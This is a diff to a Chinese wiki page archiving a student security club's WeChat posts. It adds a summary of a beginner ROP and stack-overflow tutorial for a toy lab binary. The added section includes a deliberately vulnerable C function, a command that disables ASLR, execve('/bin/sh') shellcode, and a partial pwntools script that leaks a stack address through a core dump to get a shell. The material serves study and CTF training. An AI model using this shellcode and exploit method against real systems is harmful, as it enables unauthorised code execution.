@@ -4,7 +4,7 @@ description: 0w1Club 安全团队微信公众号 2019年8月至2022年7月期间
   2019-10-11 第五周“网站结构与 HTTP 协议分析”培训预告条目，补全周次序列；保留 2019-10-24 网站结构与 HTTP 协议分析（上）条目，记录
   LAMP 环境搭建与 WordPress 部署教程；2019-10-26 第六周 CTF Web 学习引导培训预告条目、2019-11-02 第七周 CTF 逆向入门
   OD 动态调试培训预告条目、2019-11-08 第七周逆向入门培训文章条目、BUU Web 实训预告条目、2019-11-15 第八周服务器渗透培训预告条目、2020-02-09/10
-  学习资料放送两期条目、2022 年招新宣传文章条目。
+  学习资料放送两期条目、2022 年招新宣传文章条目、2019-10-11 ROP从入门到放弃技术分享条目。
 category: program-analysis
 tags:
 - 0w1Club
@@ -43,6 +43,12 @@ tags:
 - PHP
 - HTTP协议
 - 建站教程
+- ROP
+- 二进制利用
+- 栈溢出
+- Shellcode
+- GEF
+- Pwntools
 date: '2019-08-01'
 updated: '2026-11-13'
 ---
@@ -85,13 +91,13 @@ updated: '2026-11-13'
 ### 年 (2019.08 - 2019.12)
 - [ ] 2019 年 08 月
 - [ ] 2019 年 09 月
-- [x] **2019 年 10 月** — [2019-10-11 第五周 网站结构与 HTTP 协议分析培训预告](#2019-10-11-第五周-网站结构与-http-协议分析培训预告) *(网站基本结构、Apache、MySQL、WordPress、Burp Suite 预习)* · [2019-10-24 网站结构与 HTTP 协议分析（上）](#2019-10-24-网站结构与-http-协议分析上) *(LAMP 环境搭建、Apache+MySQL+PHP 安装配置、WordPress 部署、HTTP 协议分析预告)* · [2019-10-26 第六周 CTF Web 学习引导培训预告](#2019-10-26-第六周-ctf-web-学习引导培训预告) *(Burp Suite 预习、CTF 入门认知、学习路线分享、资料分发)*
-- [x] **2019 年 11 月** — [2019-11-02 第七周 CTF 逆向入门 OD 动态调试培训预告](#2019-11-02-第七周-ctf-逆向入门-od-动态调试培训预告) *(OllyDbg 环境配置、汇编基础预习、微信 PC 版逆向靶标准备)* · [2019-11-08 第七周逆向入门&动态调试分析（上）](#2019-11-08-第七周逆向入门动态调试分析上) *(逆向工程定义、应用场景、学习路径、推荐资源、任务驱动学习法)* · [2019-11-08 BUU Web 实训预告](#2019-11-08-buu-web-实训预告) *(SSRF、代码审计、Python反序列化、Phar反序列化、哈希长度扩展)* · [2019-11-15 第八周服务器渗透萌新培训预告](#2019-11-15-第八周服务器渗透萌新培训预告) *(SSH、nmap、dirb、john、Kali Linux 前置工具与靶机环境准备)*
+- [x] **2019 年 10 月** — [2019-10-11 第五周 网站结构与 HTTP 协议分析培训预告](#2019-10-11-第五周-网站结构与-http-协议分析培训预告) · [2019-10-11 ROP从入门到放弃](#2019-10-11-rop从入门到放弃) · [2019-10-24 网站结构与 HTTP 协议分析（上）](#2019-10-24-网站结构与-http-协议分析上) · [2019-10-26 第六周 CTF Web 学习引导培训预告](#2019-10-26-第六周-ctf-web-学习引导培训预告)
+- [x] **2019 年 11 月** — [2019-11-02 第七周 CTF 逆向入门 OD 动态调试培训预告](#2019-11-02-第七周-ctf-逆向入门-od-动态调试培训预告) · [2019-11-08 第七周逆向入门&动态调试分析（上）](#2019-11-08-第七周逆向入门动态调试分析上) · [2019-11-08 BUU Web 实训预告](#2019-11-08-buu-web-实训预告) · [2019-11-15 第八周服务器渗透萌新培训预告](#2019-11-15-第八周服务器渗透萌新培训预告)
 - [ ] 2019 年 12 月
 
 ### 年 (2020.01 - 2020.12)
 - [ ] 2020 年 01 月
-- [x] **2020 年 02 月** — [学习资料放送第一弹](#2020-02-09-学习资料放送第一弹) *(CTF 入门、Web 渗透、代码审计视频/PDF/靶机/思维导图资源)* · [学习资料放送第二弹](#2020-02-10-学习资料放送第二弹) *(安卓逆向、软件逆向、小白科普入门视频资源)*
+- [x] **2020 年 02 月** — [学习资料放送第一弹](#2020-02-09-学习资料放送第一弹) · [学习资料放送第二弹](#2020-02-10-学习资料放送第二弹)
 - [ ] 2020 年 03 月
 - [ ] 2020 年 04 月
 - [ ] 2020 年 05 月
@@ -118,7 +124,7 @@ updated: '2026-11-13'
 - [ ] 2021 年 12 月
 
 ### 年 (2022.01 - 2022.07)
-- [x] **2022 年 02 月** — [2022 0w1网络安全社团 招新啦~](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483943&idx=1&sn=10011c4514d0232302a091fc195a3a0e&chksm=fcd9c7f6cbae4ee0edf6d8a6ef065e517cb3a499c59f4254730355255ce1c9b35e9b32e71a02&scene=27#wechat_redirect) *(社团定位、培训体系、产学研合作、实习渠道)*
+- [x] **2022 年 02 月** — [2022 0w1网络安全社团 招新啦~](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483943&idx=1&sn=10011c4514d0232302a091fc195a3a0e&chksm=fcd9c7f6cbae4ee0edf6d8a6ef065e517cb3a499c59f4254730355255ce1c9b35e9b32e71a02&scene=27#wechat_redirect)
 - [ ] 2022 年 03 月
 - [ ] 2022 年 04 月
 - [ ] 2022 年 05 月
@@ -175,6 +181,7 @@ updated: '2026-11-13'
 | 期数 | 发布日期 | 主题 | 侧重 | 状态 |
 | :--- | :--- | :--- | :--- | :--- |
 | **第五周·预热（本文）** | 2019-10-11 | 网站结构与 HTTP 协议分析 | 网站基本结构认知、核心组件预习、Burp Suite 工具准备、博客搭建演示、HTTP 抓包入门 | ✅ 已发布 |
+| **第五周·技术分享** | 2019-10-11 | ROP从入门到放弃 | ROP 攻击原理、栈溢出利用、Shellcode 构造、GDB/GEF 调试实战、ret2libc 思路 | ✅ [已归档](#2019-10-11-rop从入门到放弃) |
 | **技术基础·落地** | 2019-10-24 | 网站结构与 HTTP 协议分析（上） | LAMP 详细搭建步骤、WordPress 图文部署教程、数据库初始化 SQL、HTTP 协议深度分析预告 | ✅ [已归档](#2019-10-24-网站结构与-http-协议分析上) |
 | **第六周·预热** | 2019-10-26 | CTF Web 学习引导 | Burp Suite 进阶预习、CTF 竞赛认知建立、Web 学习路线方法论、友好资料分发 | ✅ [已归档](#2019-10-26-第六周-ctf-web-学习引导培训预告) |
 | **第七周·预热** | 2019-11-02 | CTF逆向入门 OD动态调试入门 | 环境部署、工具验证、靶标准备、基础预习 | ✅ [已归档](#2019-11-02-第七周-ctf-逆向入门-od-动态调试培训预告) |
@@ -189,6 +196,150 @@ updated: '2026-11-13'
 - **HTTP 协议核心知识点**：请求/响应报文结构、方法语义 (GET/POST/PUT/DELETE 等)、状态码分类、Header 字段详解、Cookie/Session 机制、缓存控制、内容协商、HTTPS/TLS 握手、HTTP/2 多路复用、HTTP/3 QUIC。
 - **Burp Suite 核心模块**：Proxy (拦截代理)、Repeater (请求重放)、Intruder (自动化攻击)、Scanner (漏洞扫描)、Decoder/Encoder (编解码)、Comparer (差异对比)、Sequencer (随机性分析)、Extender (插件扩展)。
 - **进阶学习路线**：[[reverse-engineering-beginner-learning-path]] 中的任务驱动学习法同理适用 — 搭建靶场、抓包分析、漏洞复现、编写 PoC、工具二次开发。
+
+---
+
+### 2019-10-11 ROP从入门到放弃
+
+> **原文链接**：[http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483790&idx=1&sn=9c29301844c34f1672caf2cdcafdd554&chksm=fcd9c45fcbae4d4967698bf46d60121a099d29cdc2e4c2247ab181691cc4a2c7cbce1ae9ff54&scene=27#wechat_redirect](http://mp.weixin.qq.com/s?__biz=MzU3MTkzNzk4Mg==&mid=2247483790&idx=1&sn=9c29301844c34f1672caf2cdcafdd554&chksm=fcd9c45fcbae4d4967698bf46d60121a099d29cdc2e4c2247ab181691cc4a2c7cbce1ae9ff54&scene=27#wechat_redirect)  
+> **发布日期**：2019-10-11  
+> **作者**：ya0guang（0w1 社团创始人，文/图）、夜晓（排版）  
+> **标签**：#ROP #二进制利用 #栈溢出 #Shellcode #GEF #Pwntools #ASLR #NX #PIE #Canary #CTF #入门教程 #Linux_x86 #ret2libc
+
+#### 概述
+
+0w1Club 社团创始人 ya0guang 撰写的 ROP (Return Oriented Programming) 入门实战教程。文章以作者从零开始学习 ROP 技术的亲身经历为线索，系统梳理了 Linux x86 环境下栈溢出漏洞利用的核心知识体系：从堆栈布局、参数传递差异、保护机制（ASLR/NX/PIE/Canary）原理，到偏移定位、Shellcode 构造、GDB/GEF 动态调试、Core Dump 地址泄露等完整利用流程。文中配合 `ROP_STEP_BY_STEP` 开源仓库代码实战复现，特别针对 GCC 默认开启 PIE 导致的地址随机化问题给出调试对策，是二进制安全入门者极具参考价值的实战笔记。
+
+#### 核心内容结构
+
+##### 前言与学习路径
+- **背景**：作者受任复现 SGX 相关攻击，涉及 ROP 技术，此前无二进制/逆向经验，遂从零自学并记录
+- **参考资料**：蒸米大神「一步一步学ROP」系列（乌云知识库/看雪/ GitHub `zhengmin1989/ROP_STEP_BY_STEP`）
+- **假设前提**：仅假设读者了解基本 x86 汇编指令，所有实验均在 Linux 环境下执行
+- **工具推荐**：强烈建议安装 **GEF** 替代原生 GDB 完成调试工作
+
+##### 背景知识体系
+
+###### 什么是 ROP
+- **定义**：Return Oriented Programming，返回导向编程
+- **核心机制**：利用 `ret` 指令语义 — `pop IP` 将栈顶数据复制给指令指针，实现程序跳转
+- **攻击前提**：能够控制栈内容 → 控制 `ret` 返回地址 → 劫持控制流
+
+###### 栈内存布局
+- 栈从高地址向低地址增长
+- `push` 时 SP 减少，`pop` 时 SP 增加
+- 栈溢出本质：数据覆盖栈顶返回地址区域，实现控制流劫持
+
+###### 参数传递约定差异 (x86 vs x86-64)
+| 架构 | 参数传递方式 | 验证示例 |
+| :--- | :--- | :--- |
+| **x86 (32位)** | 所有参数压栈传递，从右向左入栈 | `printf` 8 个参数全部 `pushl` 入栈 |
+| **x86-64 (64位)** | 前 6 个参数依次放入 `rdi, rsi, rdx, rcx, r8, r9`，其余压栈 | `printf` 前 6 个参数寄存器传递，第 7/8 个压栈 |
+
+> **验证方法**：`gcc -S [-m32] source.c` 生成汇编对比观察
+
+###### 保护机制全景
+| 机制 | 说明 | 检测工具 |
+| :--- | :--- | :--- |
+| **ASLR** (地址空间布局随机化) | 系统级防护，随机化栈/堆/库基址 | `echo 0/2 \| sudo tee /proc/sys/kernel/randomize_va_space` 关闭/开启 |
+| **RELRO** (重定向只读) | Partial/Full，保护 GOT 表不被篡改 | `checksec` |
+| **Stack Canary** | 栈帧保护值，检测栈溢出 | `checksec` |
+| **NX** (不可执行栈) | 栈内存不可执行，阻断 Shellcode 直接运行 | `checksec` |
+| **PIE** (位置无关可执行) | 代码段基址随机化，影响 ROP Gadget 定址 | `checksec`，**GCC 近期版本默认开启**，需显式 `-no-pie` 关闭 |
+
+> **实战坑点**：GCC 默认开启 PIE 导致编译出的二进制与教程仓库不一致，需显式 `-no-pie -fno-stack-protector -z execstack` 降低防护复现基础场景
+
+##### 实战复现：x86 ROP 101
+
+###### 靶程序分析
+```c
+void vulnerable_function() {
+    char buf[128];
+    read(STDIN_FILENO, buf, 256);  // 明显的栈溢出：读入 256 字节到 128 字节缓冲区
+}
+```
+编译选项：`gcc -fno-stack-protector -z execstack -no-pie -o level1 level1.c -m32`
+
+###### 步骤 1：寻找溢出偏移
+```bash
+gef➤ pattern create 150
+gef➤ r
+# 输入 pattern 字符串，触发 segfault，观察 IP 值
+gef➤ pattern search 0x6261616b
+# 输出 offset = 140
+```
+- 溢出点位于第 140 字节，即构造 payload 时前 140 字节填充，第 141-144 字节覆盖返回地址
+
+###### 步骤 2：Shellcode 选取与分析
+```asm
+; 经典 execve("/bin/sh") shellcode (25 字节)
+xor eax, eax
+push eax
+push 0x68732f2f   ; "//sh"
+push 0x6e69622f   ; "/bin"
+mov ebx, esp      ; EBX 指向 "/bin//sh"
+push eax
+mov edx, esp
+push ebx
+mov ecx, esp
+mov al, 0xb       ; sys_execve = 11
+int 0x80
+```
+- 通过 `int 0x80` 触发系统调用，`eax=11` 对应 `sys_execve`
+- 参数构造利用栈布局：`filename="/bin//sh"`、`argv=NULL`、`envp=NULL`
+
+###### 步骤 3：Payload 构造策略
+```
+payload = shellcode + padding(140 - len(shellcode)) + shellcode_start_address
+```
+- 关键难点：**Shellcode 起始地址如何确定？** 栈地址受 ASLR 影响不固定
+
+###### 步骤 4：Core Dump 地址泄露法 (绕过 ASLR 定位栈地址)
+```python
+# pwntools 自动化脚本
+from pwn import *
+context(arch='i386', os='linux')
+io = process('./level1')
+payload = shellcode + b'A' * (140 - len(shellcode)) + p32(0xdeadbeef)  # 占位返回地址
+io.sendline(payload)
+io.wait()
+core = io.corefile
+stack_addr = core.esp - 144  # 栈指针回溯到 shellcode 起始位置
+# 重新构造正确 payload 发送...
+```
+- 首次运行生成 core dump，通过 `core.esp` 计算 shellcode 真实地址
+- 二次运行填入正确地址，成功获取 Shell
+
+###### 步骤 5：实战截图验证
+- 文中附带 GEF 界面截图展示 pattern search、core dump 分析、最终 `whoami` 成功获取 Shell 的完整过程
+
+#### 技术要点总结
+
+| 知识点 | 核心要点 | 关联进阶页面 |
+| :--- | :--- | :--- |
+| **栈溢出原理** | 缓冲区未检查边界 → 覆盖返回地址 → 劫持控制流 | [[rop-linux-x86-beginner-tutorial]] |
+| **x86/x64 调用约定** | 参数传递方式差异直接影响 ROP 链构造 | [[rop-linux-x86-beginner-tutorial#参数传递]] |
+| **保护机制组合** | ASLR+NX+PIE+Canary 叠加防御，需分步绕过 | [[linux-kernel-hardening-mechanisms]] |
+| **偏移精确定位** | Pattern 创建/搜索是通用标准流程 | [[rop-linux-x86-beginner-tutorial#偏移定位]] |
+| **Shellcode 编写** | 系统调用号、参数布局、大小端序、避免坏字符 | [[rop-linux-x86-beginner-tutorial#shellcode-构造]] |
+| **Core Dump 利用** | 通过崩溃转储泄露运行时栈地址，绕过 ASLR | [[rop-linux-x86-beginner-tutorial#实战利用流程]] |
+| **GEF 调试增强** | pattern、search、vmmap、checksec 一体化 | [[ida-pro-tips-plugins-python]] (工具生态对比) |
+
+#### 学习路线定位与延伸
+
+| 阶段 | 内容 | 关联资源 |
+| :--- | :--- | :--- |
+| **入门基础** | 汇编语言、C 语言、计组/操作系统、Linux 环境 | [[reverse-engineering-beginner-learning-path#核心预备知识]] |
+| **ROP 核心** | 栈溢出 → ret2shellcode → ret2libc → ROP Chain → SROP | [[rop-linux-x86-beginner-tutorial]] (系统化教程) |
+| **工具链精通** | GDB/GEF、Pwntools、ROPgadget、ROPper、one_gadget | [[ida-pro-tips-plugins-python]] (逆向工具生态) |
+| **实战靶场** | ROP_STEP_BY_STEP、pwnable.kr、BUUOJ、HTB | [[0w1club-wechat-archive-201908-202207#2019-11-08-buu-web-实训预告]] (社团实训) |
+| **进阶研究** | 绕过 CFI、JIT-ROP、数据导向编程、内核 ROP | [[linux-kernel-hardening-mechanisms#控制流完整性]] |
+
+#### 社团培训体系中的定位
+- **发布时间**：与第五周 Web 预热培训同天 (2019-10-11)，体现社团「逆向/PWN 与 Web 并行」的双轨培养策略
+- **作者身份**：ya0guang (社团创始人) 亲笔实战笔记，代表社团核心技术骨干的知识输出标准
+- **教学特色**：「从零开始、记录踩坑、给出对策」—— 典型的任务驱动学习法，与 [[reverse-engineering-beginner-learning-path#任务驱动学习法]] 理念一致
+- **知识传承**：文章末尾标注「本文章由 0w1 社团创始人(ya0guang) 提供，话不多说，膜就完事了」—— 体现社团内部技术传承的非正式文化氛围
 
 ---
 
@@ -641,6 +792,7 @@ updated: '2026-11-13'
 | **逆向工程入门** | 逆向概念、汇编/C++/Windows API 基础、工具链、加壳脱壳、任务驱动学习法、经典教材与视频资源 | [[0w1club-wechat-archive-201908-202207#2019-11-02-第七周-ctf-逆向入门-od-动态调试培训预告]], [[0w1club-wechat-archive-201908-202207#2019-11-08-第七周逆向入门动态调试分析上]] |
 | **Web 安全入门** | CTF Web 学习引导、Burp Suite 实战、HTTP 协议分析、BUUOJ 实训、SSRF/代码审计/反序列化/Phar/哈希扩展攻击 | [[0w1club-wechat-archive-201908-202207#2019-10-11-第五周-网站结构与-http-协议分析培训预告]], [[0w1club-wechat-archive-201908-202207#2019-10-24-网站结构与-http-协议分析上]], [[0w1club-wechat-archive-201908-202207#2019-10-26-第六周-ctf-web-学习引导培训预告]], [[0w1club-wechat-archive-201908-202207#2019-11-08-buu-web-实训预告]] |
 | **建站与 HTTP 分析** | LAMP 环境搭建、WordPress 部署、Apache/MySQL/PHP 配置、HTTP 协议基础、Burp Suite 入门 | [[0w1club-wechat-archive-201908-202207#2019-10-11-第五周-网站结构与-http-协议分析培训预告]], [[0w1club-wechat-archive-201908-202207#2019-10-24-网站结构与-http-协议分析上]] |
+| **二进制利用入门** | ROP 攻击原理、栈溢出利用、Shellcode 构造、ret2libc、GDB/GEF 调试、Core Dump 地址泄露、保护机制绕过 | [[0w1club-wechat-archive-201908-202207#2019-10-11-rop从入门到放弃]], [[rop-linux-x86-beginner-tutorial]] |
 
 ---
 
@@ -685,13 +837,15 @@ updated: '2026-11-13'
 | 1.7 | 2026-11-13 | 知识库策展人 | 新增 2019-11-02 第七周 CTF 逆向入门 OD 动态调试培训预告条目，详细记录 OllyDbg 环境配置、汇编基础预习建议、微信 PC 版逆向靶标准备、QQ 群后续练手安排等实战前置指引，完善第七周训练系列三阶段定位对比表（预热/理论/实战），关联逆向工程入门学习路径页面；更新时间轴导航 2019 年 11 月状态、标签体系（新增 OllyDbg、微信PC版）与专题分类表 |
 | 1.8 | 2026-11-13 | 知识库策展人 | 新增 2019-10-26 第六周 CTF Web 学习引导培训预告条目，详细记录 Burp Suite 预习建议、CTF 竞赛形式认知建立、Web 安全学习路线分享会安排及资料分发预告，完善训练系列六至八周定位对比表，新增「Web 安全入门」专题分类，更新标签体系（新增 Burp Suite、Web安全、学习路线、HTTP分析）；更新时间轴导航 2019 年 10 月状态 |
 | 1.9 | 2026-11-13 | 知识库策展人 | 新增 2019-10-24 网站结构与 HTTP 协议分析（上）条目，详细记录 LAMP 环境搭建全过程（Apache+PHP+MySQL 安装配置、WordPress 部署、数据库初始化）、CMS 选型理由、HTTP 协议与 Burp Suite 后续分析预告，完善 10 月训练系列定位对比表（技术基础/预热/第七周/第八周），新增「建站与 HTTP 分析」专题分类，更新标签体系（新增 LAMP、WordPress、Apache、MySQL、PHP、HTTP协议、建站教程）；更新时间轴导航 2019 年 10 月状态 |
-| 2.0 | 2026-11-13 | 知识库策展人 | **新增 2019-10-11 第五周网站结构与 HTTP 协议分析培训预告条目**，补全训练周次序列（第五周预热 → 技术基础落地 → 第六周引导 → 第七周逆向/Web并行 → 第八周渗透），详细记录网站基本结构认知、Apache/MySQL/WordPress 预习、Burp Suite 工具准备、博客搭建演示与 HTTP 抓包入门两大核心议程；更新时间轴导航 2019 年 10 月状态、训练系列定位对比表、标签体系与专题分类交叉引用 |
-| 2.1 | TBD | - | 导入 2019.08-2022.07 全量文章元数据 (标题/链接/日期/摘要) |
-| 2.2 | TBD | - | 完成按月/按专题双维度导航页生成 |
-| 2.3 | TBD | - | 接入全文检索与标签云聚合功能 |
+| 2.0 | 2026-11-13 | 知识库策展人 | 新增 2019-10-11 第五周网站结构与 HTTP 协议分析培训预告条目，补全训练周次序列（第五周预热 → 技术基础落地 → 第六周引导 → 第七周逆向/Web并行 → 第八周渗透），详细记录网站基本结构认知、Apache/MySQL/WordPress 预习、Burp Suite 工具准备、博客搭建演示与 HTTP 抓包入门两大核心议程；更新时间轴导航 2019 年 10 月状态、训练系列定位对比表、标签体系与专题分类交叉引用 |
+| 2.1 | 2026-11-13 | 知识库策展人 | **新增 2019-10-11 ROP从入门到放弃技术分享条目**，记录社团创始人 ya0guang 从零学习 ROP 的完整实战笔记：栈溢出原理、x86/x64 参数传递差异、ASLR/NX/PIE/Canary 保护机制、GEF pattern 偏移定位、Shellcode 解析与构造、Core Dump 栈地址泄露绕过 ASLR、Pwntools 自动化利用全流程；关联 [[rop-linux-x86-beginner-tutorial]] 系统化教程与 [[reverse-engineering-beginner-learning-path]] 任务驱动学习法，新增「二进制利用入门」专题分类，完善 10 月训练系列双轨并行（Web 预热 + PWN 技术分享）的培养体系全景；更新标签体系（新增 ROP、二进制利用、栈溢出、Shellcode、GEF、Pwntools、ret2libc） |
+| 2.2 | TBD | - | 导入 2019.08-2022.07 全量文章元数据 (标题/链接/日期/摘要) |
+| 2.3 | TBD | - | 完成按月/按专题双维度导航页生成 |
+| 2.4 | TBD | - | 接入全文检索与标签云聚合功能 |
 
 > **提示**：若您手持 0w1Club 历史文章合集 (HTML/PDF/Markdown)，欢迎通过 PR 或 Issue 协助补全数据源，共建安全知识图谱。
 
 ## 来源
 
 - [0w1Club-201908-202207_14](../sources/0w1Club-201908-202207_14.md)
+- [0w1Club-201908-202207_15](../sources/0w1Club-201908-202207_15.md)
